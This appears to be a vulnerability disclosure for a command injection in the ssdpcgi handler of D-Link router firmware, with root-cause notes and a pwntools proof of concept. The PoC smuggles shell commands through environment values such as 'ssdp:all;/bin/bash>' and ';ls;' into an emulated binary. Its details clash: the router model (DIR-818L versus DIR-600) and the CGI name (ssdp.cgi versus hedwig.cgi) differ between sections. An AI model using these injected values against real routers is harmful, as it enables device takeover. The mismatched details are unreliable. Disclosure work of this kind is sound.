## Remote Arbitrary Command Execution Vulnerability in ssdpcgi of D-Link DIRâ€‘818L
## Vulnerability Overview
Vendor: D-Link  
Product: D-Link DIR-600  
Affected Component: `ssdp.cgi`  
Affected Version: Firmware **v2.15WWb02**  
Vulnerability Type: Remote Arbitrary Command Execution

## Vulnerability Description
D-Link DIR-600 is a wireless router designed for home and small office environments, and it is still deployed in certain real-world network environments.

In **D-Link DIR-600 firmware v2.15WWb02**, the CGI program `hedwig.cgi` contains a command injection vulnerability. This program obtains parameters via `getenv`. An attacker can craft a malicious request to inject commands into the arguments passed to `lxmldbc_system`, which are ultimately executed through `system`, resulting in remote command execution. This can be leveraged to obtain control privileges such as a reverse shell.

## Vulnerability Root Cause Analysis
![](https://raw.githubusercontent.com/LonTan0/picgo/main/202602041041376.png)

![](https://raw.githubusercontent.com/LonTan0/picgo/main/202602041050049.png)
When processing environment variables, the program uses `getenv` to retrieve parameters, but does not sufficiently restrict symbols that may trigger command execution (such as semicolons, pipe characters, etc.). This incomplete filtering allows an attacker to construct strings such as `ssdp:all+command`, injecting malicious commands into the parameters passed to the `lxmldbc_system` function. Since this function internally uses `sprintf` to concatenate strings and then executes them via `system`, the attacker can exploit this to trigger a command injection vulnerability, ultimately achieving remote code execution, such as establishing a reverse shell.

## POC
```python
from pwn import*
context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.arch='mips'
context.os='linux'
context.endian = 'big'
context.log_level = 'debug'

def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')


#cmd=input("command:")
pay=cyclic(0x100)
print(pay)
post_content = "lontan0=AGRiot"
p = process(f'''
qemu-mipsel -g 1234 -L . \
  -0 "ssdpcgi" \
  -E HTTP_ST="ssdp:all;/bin/bash>" \
  -E REMOTE_ADDR="{pay}" \
  -E REMOTE_PORT=";ls;" \
  -E SERVER_ID="router" \
  ./htdocs/cgibin ssdpcgi
''',shell=True)

p.send(post_content)

inter()
```
![](https://raw.githubusercontent.com/LonTan0/picgo/main/202602041049664.png)
